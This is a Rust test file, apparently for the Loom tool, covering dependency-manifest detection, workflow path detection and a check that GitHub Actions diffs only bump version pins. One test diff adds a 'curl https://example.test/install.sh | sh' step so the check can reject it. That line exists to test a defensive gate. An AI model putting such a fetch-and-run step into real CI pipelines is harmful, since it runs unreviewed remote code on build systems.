use super::*;

#[test]
fn the_manifests_issue_4765_names_are_allowed() {
    for p in [
        "Cargo.toml",
        "Cargo.lock",
        "package.json",
        "package-lock.json",
        "pnpm-lock.yaml",
        "yarn.lock",
        "pyproject.toml",
        "requirements.txt",
        "requirements-dev.txt",
        "poetry.lock",
        "uv.lock",
        "go.mod",
        "go.sum",
    ] {
        assert!(is_dependency_manifest(p), "{p} should be a manifest");
    }
}

#[test]
fn nested_manifests_qualify() {
    // #7577: Loom's own backlog accumulated in nested manifests precisely
    // because they were treated differently from the root ones.
    assert!(is_dependency_manifest("mcp-loom/package.json"));
    assert!(is_dependency_manifest("dashboard/web/package-lock.json"));
    assert!(is_dependency_manifest("loom-daemon/Cargo.toml"));
}

#[test]
fn dependabot_config_is_explicitly_not_a_manifest() {
    // Issue #4765 excludes it by name: a bot rewriting its own update policy
    // is not the CI-gated version-bump class this waives criteria for.
    assert!(!is_dependency_manifest(".github/dependabot.yml"));
    assert!(!is_dependency_manifest(".github/dependabot.yaml"));
}

#[test]
fn source_and_config_files_are_not_manifests() {
    for p in [
        "src/main.rs",
        "defaults/scripts/merge-pr.sh",
        ".loom/config.json",
        "README.md",
        "package.json.bak",
        "my-requirements.txt",
        "Cargo.toml.orig",
    ] {
        assert!(!is_dependency_manifest(p), "{p} must not be a manifest");
    }
}

#[test]
fn workflow_detection_is_path_scoped() {
    assert!(is_workflow(".github/workflows/ci.yml"));
    assert!(is_workflow(".github/workflows/release.yaml"));
    assert!(!is_workflow(".github/actions/setup/action.yml"));
    assert!(!is_workflow("workflows/ci.yml"));
    assert!(!is_workflow(".github/workflows/README.md"));
}

const PIN_ONLY: &str = "\
@@ -12,7 +12,7 @@ jobs:
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v5
       - name: Build
";

#[test]
fn a_uses_pin_only_workflow_diff_qualifies() {
    assert!(workflow_diff_is_version_pin_only(PIN_ONLY));
}

#[test]
fn a_sha_pin_with_its_version_comment_qualifies() {
    let patch = "\
@@ -1,3 +1,3 @@
-      - uses: actions/checkout@11bd719 # v4.2.1
+      - uses: actions/checkout@08c6903 # v5.0.0
";
    assert!(workflow_diff_is_version_pin_only(patch));
}

#[test]
fn any_non_pin_hunk_disqualifies_the_workflow() {
    let patch = "\
@@ -12,7 +12,8 @@ jobs:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v5
+      - run: curl https://example.test/install.sh | sh
";
    assert!(!workflow_diff_is_version_pin_only(patch));
}

#[test]
fn a_local_composite_action_reference_is_not_a_version_pin() {
    // No `@ref` to pin: changing it changes WHICH action runs, not its version.
    let patch = "\
@@ -1,2 +1,2 @@
-      - uses: ./.github/actions/setup
+      - uses: ./.github/actions/setup-v2
";
    assert!(!workflow_diff_is_version_pin_only(patch));
}

#[test]
fn an_empty_patch_fails_closed() {
    assert!(!workflow_diff_is_version_pin_only(""));
    assert!(
        !workflow_diff_is_version_pin_only("@@ -1,1 +1,1 @@\n context only\n"),
        "no changed lines proves nothing, so it must not prove pin-only"
    );
}

#[test]
fn file_headers_are_not_mistaken_for_changed_lines() {
    let patch = "\
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1,1 +1,1 @@
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v5
";
    assert!(workflow_diff_is_version_pin_only(patch));
}
